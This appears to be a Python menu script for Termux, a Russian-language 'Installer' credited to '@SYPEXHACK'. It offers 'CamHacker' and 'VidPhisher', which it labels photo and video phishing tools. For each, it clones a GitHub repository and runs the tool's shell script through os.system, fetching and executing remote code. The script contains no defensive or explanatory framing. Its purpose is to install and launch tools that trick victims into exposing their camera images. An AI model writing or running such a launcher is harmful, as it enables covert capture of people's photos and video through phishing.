import os, time

from colorama import Fore, Style

os.system('cd /data/data/com.termux/files/home/installer/')
os.system('clear')

def res():
    print(Style.RESET_ALL)

def baner():
    os.system('clear')
    print(Fore.CYAN+'', Style.BRIGHT)
    print('')
    print("  ___                 _             _   _               ")
    print(" |_ _|  _ __    ___  | |_    __ _  | | | |   ___   _ __ ")
    print("  | |  | '_ \  / __| | __|  / _` | | | | |  / _ \ | '__|")
    print("  | |  | | | | \__ \ | |_  | (_| | | | | | |  __/ | |   ")
    print(" |___| |_| |_| |___/  \__|  \__,_| |_| |_|  \___| |_|   ")
    res()
    
while True:
    baner()
    print(Style.BRIGHT, Fore.CYAN+"[Telegram: @SYPEXHACK]                          ["+Fore.YELLOW+"2.9.0"+Fore.CYAN+"]")
    res()
    print(Fore.GREEN+"    ["+Fore.CYAN+"11"+Fore.GREEN+"] CamHacker  >>  Фотофишинг")
    print(Fore.GREEN+"    ["+Fore.CYAN+"12"+Fore.GREEN+"] VidPhisher >>  Видеофишинг")
    res()
    print(Style.BRIGHT,Fore.CYAN+"   ["+Fore.GREEN+"20"+Fore.CYAN+"] Страница (3)")
    res()
    print(Fore.YELLOW+"    ["+Fore.GREEN+"s"+Fore.YELLOW+"] Настройки")
    print(Fore.YELLOW+"    ["+Fore.RED+"e"+Fore.YELLOW+"] Назад")
    res()
    inp = input('  Выбери пункт>>> ')
    os.system('clear')
    


    if inp == '11':
        filename = "CamHacker"

        if os.path.exists(filename):
            os.system('clear')
            print (Fore.YELLOW+"["+Fore.GREEN+"~"+Fore.YELLOW+"] CamHacker уже установлен!")
            time.sleep(2)
            os.system('clear')
            print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск..."+Fore.WHITE+"")
            time.sleep(0.5)

            os.chdir('CamHacker')
            os.system('clear')
            os.system('bash ch.sh')
            tsu_302 = input('\n [Нажмите enter чтобы выйти]')
            os.chdir('/data/data/com.termux/files/home/installer')
            os.system('clear')

        else:
            os.system('clear')
            print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] CamHacker еще НЕ установлен!")
            time.sleep(2)
            
            os.system('clear')
            print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка CamHacker...")
            res()
            time.sleep(1.5)
            os.system('git clone https://github.com/KasRoudra/CamHacker')
            os.chdir('CamHacker')
            os.system('clear')
            os.system('bash ch.sh')
            tsu_302 = input('\n [Нажмите enter чтобы выйти]')
            os.chdir('/data/data/com.termux/files/home/installer')
            os.system('clear')



    if inp == '12':
        filename = "VidPhisher"

        if os.path.exists(filename):
            os.system('clear')
            print (Fore.YELLOW+"["+Fore.GREEN+"~"+Fore.YELLOW+"] VidPhisher уже установлен!")
            time.sleep(2)
            os.system('clear')
            print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск..."+Fore.WHITE+"")
            time.sleep(0.5)

            os.chdir('VidPhisher')
            os.system('clear')
            os.system('bash vp.sh')
            tsu_302 = input('\n [Нажмите enter чтобы выйти]')
            os.chdir('/data/data/com.termux/files/home/installer')
            os.system('clear')

        else:
            os.system('clear')
            print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] VidPhisher еще НЕ установлен!")
            time.sleep(2)
            
            os.system('clear')
            print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка VidPhisher...")
            res()
            time.sleep(1.5)
            os.system('git clone https://github.com/KasRoudra/VidPhisher')
            os.chdir('VidPhisher')
            os.system('clear')
            os.system('bash vp.sh')
            tsu_302 = input('\n [Нажмите enter чтобы выйти]')
            os.chdir('/data/data/com.termux/files/home/installer')
            os.system('clear')




    


    

    

    if inp == '20':
        baner()
        print (Fore.YELLOW+" ["+Fore.RED+"!"+Fore.YELLOW+"] Страница (3) еще не доступна!")
        res()
        print(Fore.CYAN+'    [1]'+Fore.CYAN+' Добавить утилиту в Installer')
        print(Fore.YELLOW+'    [e]'+Fore.YELLOW+' Выход')
        res()
        tsu_20 = input('  Выбери пункт>>> ')

        if tsu_20 == '1':
            os.system('xdg-open https://forms.gle/vMHny8Yp24HQZqLV9')
            os.system('clear')

        else:
            os.system('clear')


    
    if inp == 's':
        os.system('cd /data/data/com.termux/files/home/installer/')
        os.system('python set.py')


    
    if inp == 'e':
        os.system('cd /data/data/com.termux/files/home/installer/')
        res()
        os.system('clear')
        break
